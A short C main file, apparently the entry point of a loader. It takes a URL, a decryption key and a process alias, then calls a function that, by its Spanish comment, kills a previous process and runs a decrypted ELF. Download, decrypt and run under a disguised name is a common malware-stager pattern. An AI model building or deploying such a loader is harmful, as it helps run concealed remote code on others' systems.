#include "executor.h"
#include <stdlib.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <Url> <key> <name_process>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    const char *url = argv[1];
    const char *key = argv[2];
    const char *alias_name = argv[3];

    // Terminar proceso anterior y ejecutar nuevo ELF descifrado
    run_elf_executable(url,key,alias_name);

    return 0;
}
